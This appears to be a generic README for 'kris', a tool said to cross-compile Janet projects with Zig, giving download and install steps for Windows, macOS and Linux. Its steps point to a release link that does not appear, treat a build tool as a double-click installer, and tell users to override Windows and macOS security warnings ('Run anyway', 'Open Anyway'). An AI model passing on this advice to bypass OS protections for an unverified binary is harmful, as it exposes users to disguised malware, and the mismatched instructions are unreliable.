Welcome to the **kris** repository! This application lets you cross-compile Janet projects quickly and efficiently using Zig. Whether you want to build software for different platforms or simply explore programming with Janet, **kris** makes it easy.

You will find different versions of the software available in the Releases section. Follow these steps to install **kris** on your computer:

1. Click on the link above to go to the Releases page.
2. Locate the latest version of **kris**.
3. Choose the file that matches your operating system (Windows, macOS, or Linux).
4. Click on the file to begin the download.

Once the download is complete, follow the steps specific to your operating system below.

### Windows Installation

1. Locate the downloaded file (it should be in your Downloads folder).
2. Double-click the `kris.exe` file.
3. Follow the prompts to complete the installation.
4. You may need to allow the application to run. If you see a warning message, click "More info" and then "Run anyway".

### macOS Installation

1. Find the downloaded file in your Downloads folder.
2. Open the `.dmg` file by double-clicking it.
3. Drag the `kris` application into your Applications folder.
4. You may need to allow the app to run. Go to "System Preferences" > "Security & Privacy" and click "Open Anyway" if the app is blocked.

### Linux Installation

1. Open a terminal window.
2. Navigate to the directory where you downloaded the file. Use the `cd` command (e.g., `cd ~/Downloads`).
3. Make the file executable by running: `chmod +x kris`.
4. Run the application with the command: `./kris`.
